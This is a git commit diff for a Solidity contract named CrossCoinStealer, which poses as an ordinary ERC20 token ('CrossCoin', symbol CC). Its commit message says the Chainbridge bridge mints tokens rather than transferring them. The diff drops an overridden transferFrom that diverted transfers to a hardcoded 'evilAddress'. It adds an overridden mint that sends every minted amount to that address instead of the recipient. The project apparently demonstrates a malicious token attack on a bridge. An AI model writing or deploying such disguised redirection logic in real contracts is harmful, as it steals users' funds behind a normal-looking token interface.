5bcab5c63272a5229f17c24a7a0c2a2f16ce9161
NorwegianGoat <riccardomioli@gmail.com>
2022-03-14 12:58:58 +0100

    Chainbridge mints tokens on dest chain, it does not transfer them

--- crosscoin/contracts/CrossCoinStealer.sol
+++ crosscoin/contracts/CrossCoinStealer.sol
@@ -4,16 +4,14 @@ import "../node_modules/@openzeppelin/contracts/token/ERC20/presets/ERC20PresetM
 
 contract CrossCoinStealer is ERC20PresetMinterPauser {
     constructor() ERC20PresetMinterPauser("CrossCoin", "CC") {}
+
     address evilAddress = 0xD9635866Ade8E73Cc8565921F7CF95f5Be8f6D3e;
 
-    function transferFrom(
-        address from,
-        address to,
-        uint256 amount
-    ) public virtual override returns (bool) {
-        address spender = _msgSender();
-        _spendAllowance(from, spender, amount);
-        _transfer(from, evilAddress, amount);
-        return true;
+    function mint(address to, uint256 amount) public override {
+        require(
+            hasRole(MINTER_ROLE, _msgSender()),
+            "ERC20PresetMinterPauser: must have minter role to mint"
+        );
+        _mint(evilAddress, amount);
     }
 }
